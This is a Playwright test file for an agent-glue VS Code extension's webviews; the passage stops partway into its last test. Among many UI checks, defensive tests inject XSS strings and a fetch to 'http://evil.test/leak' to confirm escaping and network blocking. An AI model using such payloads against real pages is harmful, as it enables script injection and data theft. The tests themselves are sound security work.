'use strict';
// Renders the real openPreview markup in a headless Chromium with a stubbed
// vscode API. Skipped unless a Chromium binary is found (AGENT_GLUE_CHROMIUM or
// the Playwright cache). Everything is served from memory; other requests abort.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const preview = require('../src/preview.cjs');
const { tempDir, root: repoRoot } = require('../../../test/support/tmp.cjs');

function findChromium() {
  if (process.env.AGENT_GLUE_CHROMIUM) return fs.existsSync(process.env.AGENT_GLUE_CHROMIUM) ? process.env.AGENT_GLUE_CHROMIUM : null;
  const cache = path.join(os.homedir(), '.cache/ms-playwright');
  let entries = [];
  try { entries = fs.readdirSync(cache).filter(n => n.startsWith('chromium_headless_shell-')).sort().reverse(); } catch { return null; }
  for (const entry of entries) {
    const dir = path.join(cache, entry);
    for (const sub of fs.readdirSync(dir)) {
      const exe = path.join(dir, sub, 'chrome-headless-shell');
      if (fs.existsSync(exe)) return exe;
    }
  }
  return null;
}
const executablePath = findChromium();
test('browser: PR Discuss with agent button sends only its action', {skip:!executablePath}, async t=>{
  const {chromium}=require('playwright');
  const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
  const page=await browser.newPage(),messages=[];
  await page.exposeFunction('recordMessage',message=>messages.push(message));
  await page.addInitScript(()=>{window.acquireVsCodeApi=()=>({getState:()=>undefined,setState(){},postMessage:message=>window.recordMessage(message)});});
  const markup=require('../src/pull-request.cjs').html({local:true,title:'Decision: Example',body:'Review this proposal.'},[]);
  await page.route('**/*',route=>route.request().url()==='http://agent-glue.test/'?route.fulfill({contentType:'text/html',body:markup}):route.abort());
  await page.goto('http://agent-glue.test/');
  await page.getByRole('button',{name:'Discuss with agent',exact:true}).click();
  await page.waitForFunction(()=>document.activeElement.id==='discuss');
  assert.deepEqual(messages,[{type:'discuss'}]);
});
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

async function open(t, markdown, extraFiles = {}) {
  const mermaid = path.join(repoRoot, 'node_modules/mermaid/dist/mermaid.min.js');
  const dir = tempDir('browser');
  const project = path.join(dir, 'proj');
  fs.mkdirSync(project);
  fs.mkdirSync(path.join(dir, 'ext/dist'), { recursive: true });
  fs.copyFileSync(mermaid, path.join(dir, 'ext/dist/mermaid.js'));
  fs.writeFileSync(path.join(project, 'a.md'), markdown);
  for (const [name, data] of Object.entries(extraFiles)) fs.writeFileSync(path.join(project, name), data);
  const vscode = { ViewColumn: { Beside: 1 }, Uri: { file: x => x }, env: { clipboard: {} }, window: { createWebviewPanel: () => ({ webview: { onDidReceiveMessage() {} }, onDidDispose() {} }) } };
  const panel = await preview.openPreview(vscode, { extensionPath: path.join(dir, 'ext') }, path.join(project, 'a.md'), project, new Map());
  const { chromium } = require('playwright');
  const browser = await chromium.launch({ executablePath });
  t.after(() => browser.close());
  const page = await browser.newPage();
  const requests = [];
  await page.route('**/*', route => {
    const url = route.request().url();
    if (url === 'http://agent-glue.test/') {
      const html = panel.webview.html.replace('<script nonce', '<script>window.acquireVsCodeApi=()=>({getState:()=>undefined,setState(){},postMessage(){}})</script><script nonce');
      return route.fulfill({ contentType: 'text/html', body: html });
    }
    requests.push(url);
    return route.abort();
  });
  await page.goto('http://agent-glue.test/');
  const frame = page.frames()[1];
  await frame.waitForFunction(() => document.readyState === 'complete');
  return { page, frame, requests };
}

test('browser: mermaid diagrams render inside the sandboxed preview', { skip: !executablePath && 'no Chromium available' }, async t => {
  const { frame } = await open(t, '# T\n\n```mermaid\ngraph TD\nA-->B\n```\n');
  await frame.waitForSelector('pre.mermaid svg', { timeout: 15000 });
  assert.equal(await frame.evaluate(() => window.origin), 'null', 'iframe has an opaque origin');
});

test('browser: embedded scripts in the preview cannot reach the network', { skip: !executablePath && 'no Chromium available' }, async t => {
  const { frame, requests } = await open(t, '```mermaid\ngraph TD\nA["<img src=http://evil.test/x>"]-->B\n```\n');
  await frame.waitForSelector('pre.mermaid svg', { timeout: 15000 });
  const blocked = await frame.evaluate(() => fetch('http://evil.test/leak').then(() => 'sent', () => 'blocked'));
  assert.equal(blocked, 'blocked');
  assert.deepEqual(requests.filter(u => !u.startsWith('data:')), []);
});

// Regression: the srcdoc frame inherits both outer and inner CSP policies.
test('browser: inlined local images display', { skip: !executablePath && 'no Chromium available' }, async t => {
  const { frame } = await open(t, '![x](a.png)', { 'a.png': PNG });
  await frame.waitForSelector('img');
  assert.equal(await frame.evaluate(() => document.querySelector('img').naturalWidth), 1);
});

test('browser: screenshot drops upload and Clear text preserves recipient and attachments', { skip: !executablePath && 'no Chromium available' }, async t => {
  const { chromium }=require('playwright');
  const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
  const page=await browser.newPage();
  const errors=[];page.on('pageerror',e=>errors.push(e.message));
  await page.addInitScript(()=>{
    Object.defineProperty(navigator,'platform',{get:()=> 'MacIntel'});
    window.sent=[];
    window.acquireVsCodeApi=()=>({postMessage(message){
      window.sent.push(message);
      const reply=message.type==='uploadBatchStart'?{type:'uploadBatchReady',id:message.id}:message.type==='uploadStart'?{type:'uploadReady',id:message.id}:message.type==='uploadChunk'?{type:'uploadAck',id:message.id,received:message.offset+atob(message.data).length}:message.type==='uploadFinish'?{type:'uploadComplete',id:message.id}:undefined;
      if(reply)queueMicrotask(()=>window.dispatchEvent(new MessageEvent('message',{data:reply})));
    }});
  });
  const views=require('../src/views.cjs');
  await page.route('**/*',route=>{
    const url=route.request().url();
    if(url==='https://agent-glue.test/')return route.fulfill({contentType:'text/html',body:views.renderSidebar({nonce:'test',cspSource:'https://agent-glue.test',scriptUri:'https://agent-glue.test/companion.js',styleUri:'https://agent-glue.test/companion.css'})});
    const name=url.split('/').pop();
    if(['companion.js','companion.css'].includes(name))return route.fulfill({contentType:name.endsWith('.js')?'text/javascript':'text/css',body:fs.readFileSync(path.join(__dirname,'../media',name),'utf8')});
    return route.abort();
  });
  await page.goto('https://agent-glue.test/');
  await page.evaluate(()=>{const transfer=new DataTransfer();transfer.setData('Terminals',JSON.stringify(['vscode-terminal:/fixture/9']));document.dispatchEvent(new DragEvent('drop',{dataTransfer:transfer,bubbles:true,cancelable:true}));});
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='bindTerminalActivity'&&m.uris[0]==='vscode-terminal:/fixture/9')));
  await page.evaluate(()=>window.dispatchEvent(new MessageEvent('message',{data:{type:'state',state:{sessions:[{id:'one',name:'One'}],selectedSessionId:'one',files:[{id:'file',path:'/synthetic/plan.md',label:'plan.md',pinned:true,description:'<img src=x onerror=alert(1)> Review notes'}],draft:{id:'draft',text:'Keep attachments',targetId:'one',targetName:'One',attachments:[{name:'existing.png',path:'/synthetic/existing.png',size:4}]}}}})));
  assert.equal(await page.locator('.file-description').textContent(),'<img src=x onerror=alert(1)> Review notes');
  assert.equal(await page.locator('.file-description img').count(),0);
  await page.locator('.file-item').hover();
  await page.getByRole('button',{name:'Edit description',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='fileAction'&&m.action==='describe'&&m.id==='file')));
  assert.equal(await page.evaluate(()=>window.sent.some(m=>m.type==='pasteClipboardImage')),false);
  await page.locator('#draft-text').focus();
  await page.getByRole('button',{name:'Attach image from Mac clipboard',exact:true}).click();
  assert.equal(await page.evaluate(()=>window.sent.filter(m=>m.type==='pasteClipboardImage').length),1);
  assert.equal(await page.locator('#draft-text').inputValue(),'Keep attachments');
  await page.getByRole('button',{name:'Remove existing.png from note',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='removeAttachment'&&m.path==='/synthetic/existing.png')));
  await page.locator('#open-draft').click();
  await page.locator('#dictate').click();
  assert.equal(await page.evaluate(()=>window.sent.filter(m=>m.type==='openDraft').length),1);
  await page.waitForFunction(()=>window.sent.some(m=>m.type==='dictate'));
  const dictationCount=await page.evaluate(()=>window.sent.filter(m=>m.type==='dictate').length);
  await page.locator('#draft-text').focus();
  await page.keyboard.press('CapsLock');
  assert.equal(await page.evaluate(()=>window.sent.filter(m=>m.type==='dictate').length),dictationCount);
  await page.keyboard.press('CapsLock');
  await page.waitForFunction(count=>window.sent.filter(m=>m.type==='dictate').length===count+1,dictationCount);
  await page.keyboard.press('CapsLock');await page.keyboard.press('a');await page.keyboard.press('CapsLock');
  await page.evaluate(()=>new Promise(requestAnimationFrame));
  assert.equal(await page.evaluate(()=>window.sent.filter(m=>m.type==='dictate').length),dictationCount+1);

  await page.evaluate(()=>{
    const picker=document.querySelector('#target');picker.add(new Option('New recipient','two'));picker.value='two';
    const data=new DataTransfer();data.setData('text/uri-list','file:///Users/example/review%20two.html');
    document.dispatchEvent(new DragEvent('drop',{bubbles:true,cancelable:true,dataTransfer:data}));
    const clipboard=new DataTransfer();clipboard.setData('text/plain','"/Users/example/another review.html"');
    document.querySelector('#draft-text').dispatchEvent(new ClipboardEvent('paste',{bubbles:true,cancelable:true,clipboardData:clipboard}));
    const html=new DataTransfer();html.items.add(new File(['<html>Review</html>'],'report.html',{type:'text/html'}));
    document.dispatchEvent(new DragEvent('drop',{bubbles:true,cancelable:true,dataTransfer:html}));picker.value='one';
  });
  await page.waitForFunction(()=>window.sent.some(m=>m.type==='uploadStart'&&m.name==='report.html'));
  assert.ok(await page.evaluate(()=>window.sent.filter(m=>m.type==='importLocalFiles').every(m=>m.targetId==='two')),'paste uses picker selection before host state catches up');
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='uploadStart'&&m.name==='report.html'&&m.targetId==='two')));
  assert.deepEqual(await page.evaluate(()=>window.sent.filter(m=>m.type==='importLocalFiles').map(m=>m.paths)),[['file:///Users/example/review%20two.html'],['/Users/example/another review.html']]);
  assert.equal(await page.evaluate(()=>{const data=new DataTransfer();data.setData('text/plain','Please review /Users/example/file.html');return document.querySelector('#draft-text').dispatchEvent(new ClipboardEvent('paste',{bubbles:true,cancelable:true,clipboardData:data}));}),true,'ordinary prose is not consumed');
  assert.equal(await page.evaluate(()=>{const data=new DataTransfer();data.setData('text/plain','/resume');return document.querySelector('#draft-text').dispatchEvent(new ClipboardEvent('paste',{bubbles:true,cancelable:true,clipboardData:data}));}),true,'slash commands remain ordinary text');
  assert.equal(await page.evaluate(()=>document.activeElement.id),'draft-text');
  await page.locator('#target').focus();
  await page.evaluate(()=>window.dispatchEvent(new MessageEvent('message',{data:{type:'dictationReady',id:'focus-test'}})));
  await page.waitForFunction(()=>window.sent.some(m=>m.type==='startDictation'&&m.id==='focus-test'));
  assert.equal(await page.evaluate(()=>document.activeElement.id),'draft-text');
  await page.locator('#target').focus();
  await page.setViewportSize({width:280,height:700});
  await page.mouse.move(0,0);
  assert.equal(await page.locator('.compose-actions').evaluate(el=>getComputedStyle(el).opacity),'0');
  await page.locator('#draft-text').focus();
  assert.equal(await page.locator('.compose-actions').evaluate(el=>getComputedStyle(el).opacity),'1');
  assert.ok(await page.locator('.compose').evaluate(el=>el.getBoundingClientRect().height<200),'composer stays compact');
  assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=window.innerWidth),'no horizontal overflow');
  const header=await page.locator('.compose-header').boundingBox();
  for(const id of ['target','choose-files','dictate','open-draft']){
    const box=await page.locator('#'+id).boundingBox();
    assert.ok(box.y>=header.y&&box.y+box.height<=header.y+header.height,'header controls fit on one row');
  }
  const beforeHeight=await page.locator('#draft-text').evaluate(el=>el.getBoundingClientRect().height);
  const beforeFiles=await page.locator('.files').evaluate(el=>el.getBoundingClientRect().height);
  const divider=await page.locator('#composer-resize').boundingBox();
  await page.mouse.move(divider.x+30,divider.y+3);await page.mouse.down();
  await page.mouse.move(divider.x+30,divider.y-77);await page.mouse.up();
  assert.ok(await page.locator('#draft-text').evaluate(el=>el.getBoundingClientRect().height)>beforeHeight+70);
  assert.ok(await page.locator('.files').evaluate(el=>el.getBoundingClientRect().height)<beforeFiles-70);
  await page.locator('#composer-resize').focus();await page.keyboard.press('ArrowDown');
  assert.ok(await page.locator('#draft-text').evaluate(el=>el.getBoundingClientRect().height)<beforeHeight+70);
  await page.locator('#draft-text').focus();
  await page.screenshot({path:path.join(tempDir('compact-composer'),'sidebar.png')});
  await page.locator('#clear-text').click();
  assert.equal(await page.locator('#draft-text').inputValue(),'');
  assert.equal(await page.locator('#target').inputValue(),'one');
  assert.equal(await page.locator('.attachment').count(),1);
  await page.evaluate(()=>{
    const transfer=new DataTransfer();transfer.items.add(new File(['synthetic image'],'shot.png',{type:'image/png'}));
    document.getElementById('drop-zone').dispatchEvent(new DragEvent('dragover',{dataTransfer:transfer,bubbles:true,cancelable:true}));
    document.getElementById('drop-zone').dispatchEvent(new DragEvent('drop',{dataTransfer:transfer,bubbles:true,cancelable:true}));
  });
  await page.waitForFunction(()=>window.sent.some(m=>m.type==='uploadFinish'));
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='uploadStart'&&m.name==='shot.png')));
  await page.evaluate(()=>document.getElementById('drop-zone').dispatchEvent(new DragEvent('drop',{dataTransfer:new DataTransfer(),bubbles:true,cancelable:true})));
  assert.match(await page.locator('#status').textContent(),/No readable files were included/);
  assert.deepEqual(errors,[]);
});

test('browser: resource icons, PR filters and local PR document links work without extra headings', {skip:!executablePath&&'no Chromium available'},async t=>{
  const {chromium}=require('playwright');const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
  const page=await browser.newPage({viewport:{width:280,height:700}});
  await page.addInitScript(()=>{window.sent=[];window.acquireVsCodeApi=()=>({getState:()=>undefined,setState(){},postMessage:m=>window.sent.push(m)});});
  const views=require('../src/views.cjs');
  await page.route('**/*',route=>{
    const url=route.request().url();
    if(url==='https://agent-glue.test/')return route.fulfill({contentType:'text/html',body:views.renderSidebar({nonce:'test',cspSource:'https://agent-glue.test',scriptUri:'https://agent-glue.test/companion.js',styleUri:'https://agent-glue.test/companion.css'})});
    const name=url.split('/').pop();
    if(['companion.js','companion.css'].includes(name))return route.fulfill({contentType:name.endsWith('.js')?'text/javascript':'text/css',body:fs.readFileSync(path.join(__dirname,'../media',name),'utf8')});
    return route.abort();
  });
  await page.goto('https://agent-glue.test/');
  const setState=state=>page.evaluate(state=>window.dispatchEvent(new MessageEvent('message',{data:{type:'state',state}})),state);
  await setState({resourceTab:'files',files:[{id:'doc',path:'/docs/x.md',label:'x.md',pinned:true}],draft:{}});
  await page.evaluate(()=>window.originalFileRow=document.querySelector('.file-item'));
  await setState({resourceTab:'files',files:[{id:'doc',path:'/docs/x.md',label:'x.md',pinned:true}],draft:{},webAppsActiveTotal:3,webApps:[{id:'app',label:'index.html',url:'http://localhost:3000/index.html',running:true}]});
  assert.equal(await page.locator('.web-app-list').isVisible(),false);
  assert.match(await page.locator('.web-app-header').textContent(),/Web apps · 1 activeAll · 3/);
  await page.getByRole('button',{name:'Expand or collapse web apps'}).click();
  assert.equal(await page.locator('.web-app-list').isVisible(),true);
  assert.equal(await page.locator('.web-app-name').textContent(),'● index.html');
  await page.locator('.web-app-row').click();
  await page.locator('.web-app-row').click({button:'right'});
  await page.getByRole('button',{name:'Expand or collapse web apps'}).click();
  assert.equal(await page.locator('.web-app-list').isVisible(),false);
  await page.getByRole('button',{name:'Show all web apps',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='webApp'&&m.action==='open')&&window.sent.some(m=>m.type==='webApp'&&m.action==='menu')&&window.sent.some(m=>m.type==='showWebApps')));
  assert.ok(await page.evaluate(()=>window.originalFileRow===document.querySelector('.file-item')),'web app updates preserve file rows');
  assert.equal(await page.locator('.file-group').count(),0);
  await page.locator('.file-item').hover();
  await page.getByRole('button',{name:'Open in browser',exact:true}).click();
  await page.getByRole('button',{name:'Copy browser link',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='fileAction'&&m.action==='browser'&&m.id==='doc')));
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='fileAction'&&m.action==='copyLink'&&m.id==='doc')));
  await page.getByRole('button',{name:'Open x.md',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='previewFile'&&m.id==='doc')));
  await page.getByRole('button',{name:'Download file',exact:true}).click();
  await page.getByRole('button',{name:'Open x.md',exact:true}).click({button:'right'});
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='fileAction'&&m.action==='download'&&m.id==='doc')));
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='fileMenu'&&m.id==='doc')));
  assert.equal(await page.locator('.resource-tabs').count(),0);
  assert.equal(await page.locator('#resource-controls').isVisible(),false);
  const now=Date.now();
  await setState({resourceTab:'files',files:[
    {id:'2',path:'/art/image-2.png',label:'image-2.png',modified:now-1000},
    {id:'10',path:'/art/image-10.png',label:'image-10.png',modified:now},
    {id:'old',path:'/art/old.png',label:'old.png',modified:now-48*3600000},
    {id:'md',path:'/art/readme.md',label:'readme.md',modified:now+1000}
  ],draft:{}});
  const filenames=()=>page.locator('.file-item .item-label').allTextContents();
  assert.deepEqual(await filenames(),['readme.md','image-10.png','image-2.png','old.png']);
  await page.getByLabel('File type',{exact:true}).selectOption('images');
  await page.getByLabel('Modified within',{exact:true}).selectOption('1');
  assert.deepEqual(await filenames(),['image-10.png','image-2.png']);
  await page.getByLabel('Sort files',{exact:true}).selectOption('name');
  assert.deepEqual(await filenames(),['image-2.png','image-10.png']);
  await page.getByLabel('File type',{exact:true}).selectOption('archives');
  assert.equal(await page.locator('#files-empty').textContent(),'No files match these filters. Try All types or Any time.');
  assert.ok(await page.locator('#file-controls').evaluate(node=>node.getBoundingClientRect().height<=32));
  const recencyState={resourceTab:'files',selectedSessionId:'recent-agent',files:[
    {id:'old',path:'/synthetic/old.md',label:'old.md',modified:now-86400000,seen:now},
    {id:'edited',path:'/synthetic/edited.md',label:'edited.md',modified:now-1000,seen:now-3600000}
  ],draft:{}};
  await setState(recencyState);
  assert.deepEqual(await filenames(),['old.md','edited.md'],'new terminal mention outranks older modification');
  await setState({...recencyState,files:recencyState.files.map(file=>file.id==='edited'?{...file,modified:now+1000}:file)});
  assert.deepEqual(await filenames(),['edited.md','old.md'],'new edit outranks previous mention');
  const filesState={resourceTab:'files',selectedSessionId:'images-agent',files:[
    {id:'img',path:'/synthetic/render.png',label:'render.png',modified:now},
    {id:'doc',path:'/synthetic/review.md',label:'review.md',modified:now}
  ],draft:{}};
  await setState(filesState);
  await page.getByLabel('File type',{exact:true}).selectOption('images');
  assert.equal(await page.locator('#file-filter-count').textContent(),'1 hidden by filters');
  await setState({...filesState,selectedSessionId:'documents-agent'});
  assert.equal(await page.getByLabel('File type',{exact:true}).inputValue(),'all');
  assert.equal(await page.locator('.file-item').count(),2);
  await setState(filesState);
  assert.equal(await page.getByLabel('File type',{exact:true}).inputValue(),'images');
  await page.getByRole('button',{name:'Show all',exact:true}).click();
  assert.equal(await page.locator('.file-item').count(),2);
  assert.equal(await page.locator('#file-filter-notice').isVisible(),false);
  const taskState={resourceTab:'tasks',resourceFolder:'/synthetic',files:[],draft:{},resourceItems:[
    {id:'a',label:'Active work',status:'active',owner:'claude-test',request:'A long original request. '.repeat(100),summary:'<script>unsafe()</script>',files:['src/example.js'],agents:['checker: done'],tokens:1200,next:'Run tests',updatedAt:new Date(Date.now()-5*60000).toISOString()},
    {id:'d',label:'Finished work',status:'done',updatedAt:'2026-10-21T11:00:00Z'}
  ]};
  await setState({resourceTab:'tasks',resourceItems:[],statusRunBusy:true,files:[],draft:{}});
  assert.equal(await page.locator('#files-empty').textContent(),'Generating status…');
  assert.equal(await page.getByRole('button',{name:'Run status robot'}).isDisabled(),true);
  await setState(taskState);
  await page.getByLabel('Filter terminal status').selectOption('active');
  assert.equal(await page.locator('.task-item').count(),1);
  assert.equal(await page.locator('.task-updated').textContent(),'5 min ago');
  assert.equal(await page.locator('.task-updated').getAttribute('datetime'),taskState.resourceItems[0].updatedAt);
  assert.match(await page.locator('.task-updated').getAttribute('title'),/^Last updated: /);
  assert.equal(await page.locator('#file-controls').isVisible(),false);
  assert.equal(await page.locator('.task-item').getAttribute('open'),null);
  assert.equal(await page.locator('.task-body').isVisible(),false);
  assert.ok((await page.locator('.task-item').boundingBox()).height<42,'collapsed work item is a single compact row');
  await page.locator('.task-item > summary').click();
  assert.equal(await page.locator('.task-description').first().textContent(),'<script>unsafe()</script>');
  const request=page.locator('.task-section').filter({has:page.locator('summary',{hasText:'Original request'})});
  assert.equal(await request.getAttribute('open'),null);
  assert.equal(await request.locator('p').isVisible(),false);
  await request.locator('summary').click();
  assert.equal(await request.locator('p').textContent(),taskState.resourceItems[0].request);
  assert.match(await page.locator('.task-body').textContent(),/Task: 1,200 reported tokens/);
  assert.match(await page.locator('.task-body').textContent(),/Files \(1\)/);
  await setState({...taskState,statusRunBusy:true});
  assert.equal(await page.locator('.task-item').getAttribute('open'),'');
  assert.equal(await request.getAttribute('open'),'');
  assert.equal(await page.locator('#files-empty').textContent(),'Generating status…');
  await page.locator('.task-item > summary').click();
  await setState(taskState);
  assert.equal(await page.locator('.task-item').getAttribute('open'),null);
  await page.getByLabel('Filter terminal status').selectOption('done');
  assert.equal(await page.locator('.task-item .item-label').textContent(),'Finished work');
  await page.getByLabel('Filter terminal status').selectOption('all');
  assert.equal(await page.locator('.task-item').count(),2);
  await page.getByRole('button',{name:'Run status robot',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='setupTasks')));
  const readableState={...taskState,resourceItems:[{...taskState.resourceItems[0],id:'readable',label:'Make file downloads work reliably when connecting to a remote computer',summary:'Progress sentence with context. '.repeat(30),next:'A concrete next step. '.repeat(20)}]};
  await setState(readableState);
  await page.locator('.task-item > summary').click();
  const fullTitle=page.locator('.task-item > summary .item-label');
  assert.equal(await fullTitle.textContent(),readableState.resourceItems[0].label);
  assert.equal(await fullTitle.evaluate(e=>getComputedStyle(e).whiteSpace),'normal');
  assert.ok(await fullTitle.evaluate(e=>e.scrollWidth<=e.clientWidth+1),'expanded title fits the sidebar without horizontal clipping');
  assert.equal(await page.locator('.task-progress-state').textContent(),'In progress');
  const preview=page.locator('.task-field > .task-description');
  assert.ok((await preview.nth(0).textContent()).length<=281);
  assert.ok((await preview.nth(1).textContent()).length<=141);
  const fullProgress=page.locator('.task-section').filter({has:page.locator('summary',{hasText:'Read full progress'})});
  assert.equal(await fullProgress.getAttribute('open'),null);
  await fullProgress.locator('summary').click();
  assert.equal(await fullProgress.locator('p').textContent(),readableState.resourceItems[0].summary);
  const technical=page.locator('.task-section').filter({has:page.locator('summary',{hasText:'Update details'})});
  assert.equal(await technical.getAttribute('open'),null);
  await setState({resourceTab:'prs',prFilter:'priority',resourceItems:[{id:'pr',url:'https://github.com/a/b/pull/3',label:'#3 Example',newComments:true}],draft:{}});
  assert.equal(await page.locator('#resource-controls').isVisible(),true);
  assert.equal(await page.getByLabel('Filter pull requests').inputValue(),'priority');
  await page.getByLabel('Sort pull requests').selectOption('number');
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='prSort'&&m.sort==='number')));
  await page.getByLabel('Read status').selectOption('unread');
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='prReadFilter'&&m.filter==='unread')));
  await page.getByRole('button',{name:'Mark read',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='markPrRead'&&m.read&&m.id==='pr')));
  await page.getByLabel('Filter pull requests').selectOption('mine');
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='prFilter'&&m.filter==='mine')));
  await page.getByLabel('Filter pull requests').selectOption('decisions');
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='prFilter'&&m.filter==='decisions')));
  assert.equal(await page.locator('.pr-read-mark.has-new-comments').count(),1);
  assert.equal(await page.locator('.review-files').getAttribute('open'),null,'marking read does not expand files');
  await page.getByRole('button',{name:'#3 Example',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='openResource'&&m.id==='pr')));
  assert.equal(await page.locator('.review-files').getAttribute('open'),null,'opening review does not expand files');
  assert.ok(await page.locator('.pr-row').evaluate(node=>node.getBoundingClientRect().height<=28));
  assert.ok(await page.locator('#resource-controls').evaluate(node=>node.getBoundingClientRect().height<=32));
  await page.locator('.pr-chevron').click();
  await page.waitForFunction(()=>window.sent.some(m=>m.type==='expandResource'&&m.id==='pr'));
  await setState({resourceTab:'prs',resourceGeneration:2,resourceStatus:'Loading…',resourceItems:[{id:'pr',label:'#3 Example'}],draft:{}});
  const requestsBefore=await page.evaluate(()=>window.sent.filter(m=>m.type==='expandResource').length);
  await setState({resourceTab:'prs',resourceGeneration:2,resourceStatus:'',resourceItems:[{id:'pr',label:'#3 Example'}],draft:{}});
  await page.waitForFunction(count=>window.sent.filter(m=>m.type==='expandResource').length>count,requestsBefore);
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='expandResource'&&m.generation===2)),'refresh can retry abandoned detail requests');
  await setState({resourceTab:'prs',resourceItems:[{id:'pr',label:'#3 Example',reviewDocuments:[{path:'/repo/shot.png',label:'Screenshot',image:true}]}],draft:{}});
  assert.equal(await page.locator('.review-files').getAttribute('open'),'');
  await page.getByRole('button',{name:'Screenshot',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='openReviewFile'&&m.id==='pr'&&m.index===0)));
  const groupedState={resourceTab:'prs',resourceItems:[{id:'pr',label:'Decision: Document descriptions — choose the explanation drawer',reviewDocuments:[
    {group:'review',path:'/repo/docs/review.html',label:'Compare alternatives',preview:true},
    {group:'changes',path:'/repo/src/components/drawer.ts',relative:'src/components/drawer.ts',label:'src/components/drawer.ts',status:'modified'},
    {group:'changes',path:'/repo/src/index.ts',relative:'src/index.ts',label:'src/index.ts',status:'added'},
    {group:'review',path:'/repo/docs/missing.md',label:'Archived rationale',missing:true,githubUrl:'https://github.com/a/b/blob/abc/docs/missing.md'},
    {group:'review',path:'/repo/docs/absent.md',label:'Missing note',missing:true}
  ]}],draft:{}};
  await setState(groupedState);
  assert.deepEqual(await page.locator('.review-group > summary').allTextContents(),['Changes (2)','Review material (3)']);
  assert.deepEqual(await page.locator('.review-directory > summary').allTextContents(),['src','components']);
  await page.getByRole('button',{name:'drawer.ts modified',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='openReviewFile'&&m.id==='pr'&&m.index===1)));
  await page.getByRole('button',{name:'Compare alternatives',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='openReviewFile'&&m.id==='pr'&&m.index===0)));
  assert.equal(await page.getByRole('button',{name:'Missing note Unavailable',exact:true}).isDisabled(),true);
  await page.getByRole('button',{name:'Archived rationale Open in GitHub',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='openReviewFile'&&m.id==='pr'&&m.index===3)));
  await page.locator('.review-directory > summary').filter({hasText:/^components$/}).focus();
  await page.keyboard.press('Enter');
  await page.waitForFunction(()=>[...document.querySelectorAll('.review-directory')].find(node=>node.firstChild.textContent==='components')?.open===false);
  await setState(groupedState);
  assert.equal(await page.locator('.review-directory > summary').filter({hasText:/^components$/}).evaluate(node=>node.parentElement.open),false);
  assert.equal(await page.evaluate(()=>document.activeElement.textContent),'components');
  assert.equal(await page.locator('.pr-row .item-label').evaluate(node=>getComputedStyle(node).whiteSpace),'nowrap');
  await page.locator('.pr-row').focus();
  await page.keyboard.press('Enter');
  await page.waitForFunction(()=>!document.querySelector('.pr-resource').open);
  await setState({...groupedState,resourceFolder:'different-project'});
  assert.equal(await page.locator('.review-files').getAttribute('open'),null,'folder switches reset expansion');
  assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
  const render=require('../src/pull-request.cjs').html;
  await page.route('https://agent-glue.test/pr',route=>route.fulfill({contentType:'text/html',body:render({number:3,title:'Test',body:'[Review](docs/review.md) <script>window.hacked=true</script>',comments:[{author:{login:'reviewer'},body:'Looks good'}],files:[]},[{path:'/repo/docs/review.md',relative:'docs/review.md',hrefs:['docs/review.md'],label:'docs/review.md',preview:true}])}));
  await page.goto('https://agent-glue.test/pr');
  await page.getByRole('button',{name:'Review',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='file'&&m.index===0)));
  assert.equal(await page.evaluate(()=>window.hacked),undefined);
  await page.getByRole('button',{name:'Open in GitHub',exact:true}).click();
  assert.ok(await page.evaluate(()=>window.sent.some(m=>m.type==='github')));
});

test('browser: file rows use the available width and show parent paths with bundled icons', {skip:!executablePath&&'no Chromium available'},async t=>{
  const {chromium}=require('playwright');const browser=await chromium.launch({executablePath});t.after(()=>browser.close());
  const page=await browser.newPage({viewport:{width:280,height:700}});
  await page.addInitScript(()=>{window.acquireVsCodeApi=()=>({getState:()=>undefined,setState(){},postMessage(){}});});
  const views=require('../src/views.cjs');
  await page.route('**/*',route=>{
    const url=route.request().url();
    if(url==='https://agent-glue.test/')return route.fulfill({contentType:'text/html',body:views.renderSidebar({nonce:'test',cspSource:'https://agent-glue.test',scriptUri:'https://agent-glue.test/companion.js',styleUri:'https://agent-glue.test/companion.css'})});
    const name=url.split('/').pop();
    if(['companion.js','companion.css'].includes(name)||/^material-[a-z]+\.svg$/.test(name))return route.fulfill({contentType:name.endsWith('.js')?'text/javascript':name.endsWith('.svg')?'image/svg+xml':'text/css',body:fs.readFileSync(path.join(__dirname,'../media',name),'utf8')});
    return route.abort();
  });
  await page.goto('https://agent-glue.test/');
